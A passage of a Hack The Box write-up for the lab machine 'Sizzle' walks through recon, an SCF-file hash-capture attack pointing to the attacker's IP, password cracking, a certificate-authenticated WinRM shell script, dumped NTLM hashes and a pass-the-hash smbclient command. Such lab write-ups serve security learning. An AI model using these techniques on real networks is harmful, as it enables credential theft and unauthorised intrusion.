&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://sizzle.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/31 19:51:59 Starting gobuster
=====================================================
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
=====================================================
2019/05/31 19:53:24 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;certenroll-sounds-interesting-but-unfortunately-its-a-403-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/certenroll&lt;/code&gt; sounds interesting, but unfortunately it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-time-to-check-smb-&quot;&gt;It’s time to check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; .&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb-scf-file-attack-amandas-credentials&quot;&gt;SMB, SCF File Attack, amanda’s Credentials&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-we-need-to-know-is-the-shares-we-can-use-smbclient-to-list-the-shares-&quot;&gt;First thing we need to know is the shares, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient --list //sizzle.htb/ -U &quot;&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-noticed-that-there-was-a-share-for-active-directory-certificate-services-most-likely-certsrv-will-be-on-the-web-server-&quot;&gt;I noticed that there was a share for Active Directory Certificate Services. Most likely &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt; will be on the web server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sizzle.htb/certsrv&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;yes-it-was-there-and-we-need-credentials-back-to-smb-the-only-share-i-could-access-anonymously-was-department-shares-&quot;&gt;Yes it was there, and we need credentials. Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; the only share I could access anonymously was &lt;code class=&quot;highlighter-rouge&quot;&gt;Department Shares&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-a-lot-of-directories-i-could-write-to-2-of-them---zz_archive-and-userspublic&quot;&gt;It had a lot of directories, I could write to 2 of them :  &lt;code class=&quot;highlighter-rouge&quot;&gt;ZZ_ARCHIVE&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-looking-for-credentials-since-we-can-write-to-one-of-the-directories-then-we-can-possibly-apply-an-scf-file-attack-you-can-read-about-it-here-we-are-going-to-put-an-scf-file-in-userspublic-it-looks-like-this-&quot;&gt;We are looking for credentials. Since we can write to one of the directories then we can possibly apply an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack. You can read about it &lt;a href=&quot;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&quot;&gt;here&lt;/a&gt;. We are going to put an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file in &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;. It looks like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Shell]
Command=2
IconFile=\\10.10.xx.xx\share\rick.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-run-responder-whenever-a-user-browses-that-directory-he-will-automatically-try-to-connect-to-my-box-through-smb-thats-when-responder-catches-the-hashes-more-info-in-the-link-above&quot;&gt;Then we will run &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt;. Whenever a user browses that directory he will automatically try to connect to my box through &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, that’s when &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; catches the hashes. More info in the link above.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;reponder -I tun0&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;responder-caught-hash-for-a-user-called-amanda-lets-crack-it-with-john-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; caught hash for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;. Let’s crack it with &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-ashare1972&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;requesting-a-certificate-winrm-session-as-amanda&quot;&gt;Requesting a Certificate, WinRm Session as amanda&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-access-certenroll-as-amanda-and-it-worked-fine-&quot;&gt;I tried to access &lt;code class=&quot;highlighter-rouge&quot;&gt;certenroll&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt; and it worked fine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-went-to-certsrv--and-used-amandas-credentials-to-authenticate&quot;&gt;So I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt;  and used &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials to authenticate&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-its-time-to-get-a-certificate-but-wait-a-second-whats-the-certificate-for-anyway-&quot;&gt;Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ?&lt;/h4&gt;
&lt;h4 id=&quot;a-full-nmap-scan-shows-that-winrm-ports-are-open-&quot;&gt;A full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ports are open :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -T5 -vvv --max-retries 1 sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:22:10 2019 as: nmap -p- -T5 -vvv -o nmapfull --max-retries 1 sizzle.htb
Warning: 10.10.10.103 giving up on port because retransmission cap hit (1).
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up, received echo-reply ttl 127 (0.11s latency).
Scanned at 2019-05-31 20:22:10 EET for 220s
Not shown: 65506 filtered ports
Reason: 65506 no-responses
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
54195/tcp open  unknown          syn-ack ttl 127
54204/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri May 31 20:25:50 2019 -- 1 IP address (1 host up) scanned in 220.02 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 5985,5986 -sV -sT -sC sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--2&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:27:46 2019 as: nmap -p 5985,5986 -sV -sT -sC -o nmapwinrm sizzle.htb
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.11s latency).

PORT     STATE SERVICE  VERSION
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-05-31T17:56:26
|_Not valid after:  2020-05-30T17:56:26
|_ssl-date: 2019-05-31T18:28:30+00:00; -6s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6s, deviation: 0s, median: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 20:28:43 2019 -- 1 IP address (1 host up) scanned in 57.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;port-5985-uses-http-while-5986-uses-https-when-i-got-amandas-credentials-i-tried-to-connect-to-port-5985-and-i-couldnt-so-we-will-do-it-through-port-5986-thats-why-we-need-a-certificate-if-you-dont-know-how-to-connect-through-winrm-well-get-to-that-later&quot;&gt;Port 5985 uses &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; while &lt;code class=&quot;highlighter-rouge&quot;&gt;5986&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. When I got &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, we’ll get to that later.)&lt;/h4&gt;
&lt;h4 id=&quot;we-will-generate-a-certificate-request-and-a-private-key-&quot;&gt;We will generate a certificate request and a private key :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-submit-an-advanced-certificate-request-paste-our-request-and-download-the-certificate-base64-encoded&quot;&gt;Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/22.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-use-winrm-but-whats-winrm-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, but what’s &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ?&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;Windows Remote Management (WinRM) is the Microsoft implementation of &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol&quot;&gt;WS-Management Protocol&lt;/a&gt;, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.
The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary&quot;&gt;&lt;em&gt;Intelligent Platform Management Interface (IPMI)&lt;/em&gt;&lt;/a&gt;, along with the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=84396&quot;&gt;Event Collector&lt;/a&gt; are components of the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=45204&quot;&gt;Windows Hardware Management&lt;/a&gt; features. -&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/portal&quot;&gt;Microsoft&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;winrm-is-not-meant-to-be-used-from-linux-but-luckily-theres-a-ruby-library-for-it-thats-how-we-will-connect&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; is not meant to be used from Linux but luckily there’s a &lt;a href=&quot;https://github.com/WinRb/WinRM&quot;&gt;Ruby library&lt;/a&gt; for it. That’s how we will connect.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-alamots-shell-and-added-some-stuff-for-the-cert-and-the-key-&quot;&gt;I used &lt;a href=&quot;https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb&quot;&gt;Alamot’s shell&lt;/a&gt; and added some stuff for the cert and the key :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://10.10.10.103:5986/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;client_cert: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/certnew.cer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;client_key: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/request.key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gets&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-it-worked-&quot;&gt;And it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-there-was-no-usertxt-&quot;&gt;But there was no &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stored-ntlm-hashes-secretsdump-privilege-escalation&quot;&gt;Stored NTLM Hashes, Secretsdump, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;through-the-filesystem-enumeration-i-found-a-file-called-filetxt-in-cwindowssystem32-that-file-had-ntlm-hashes-for-all-users-&quot;&gt;Through the filesystem enumeration I found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;file.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32&lt;/code&gt;. That file had NTLM hashes for all users !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -   
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;honestly-i-dont-know-how-did-that-get-there-after-resetting-the-machine-the-file-was-still-there-i-dont-know-if-the-creator-made-an-unintended-mistake-but-anyway-lets-see-how-can-we-use-that&quot;&gt;Honestly I don’t know how did that get there, After resetting the machine the file was still there. I don’t know if the creator made an unintended mistake but anyway let’s see how can we use that.&lt;/h4&gt;
&lt;h4 id=&quot;that-administrator-hash-was-useless-i-tried-it-with-smb-i-cracked-it-tried-psexec-it-didnt-work-i-cracked-mrlkys-hash-&quot;&gt;That Administrator hash was useless, I tried it with &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, I cracked it, tried &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt;. It didn’t work. I cracked &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt;’s hash :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-was-football7-i-used-it-with-secretsdumppy-from-impacket-and-got-another-administrators-hash-&quot;&gt;The password was &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, I used it with &lt;code class=&quot;highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and got another Administrator’s hash :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-uncrackable-i-tried-psexec-metasploit-module-and-for-some-reason-it-didnt-work-so-i-used-the-hash-with-smb-to-access-c-then-i-downloaded-the-flags&quot;&gt;It was uncrackable, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; module and for some reason it didn’t work so I used the hash with &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; to access &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; then I downloaded the flags.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient //sizzle.htb/C$ -U &quot;Administrator&quot; --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/30.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-forget-that-we-saw-that-lets-try-something-more-realistic&quot;&gt;Now forget that we saw that, Let’s try something more realistic.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;backtrack&quot;&gt;Backtrack&lt;/h3&gt;
&lt;h4 id=&quot;back-to-the-winrm-session-as-amanda-lets-examine-our-environment&quot;&gt;Back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;, let’s examine our environment.&lt;/h4&gt;
&lt;h4 id=&quot;there-was-applocker-&quot;&gt;There was AppLocker :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;antivirus-&quot;&gt;Antivirus :&lt;/h4&gt;
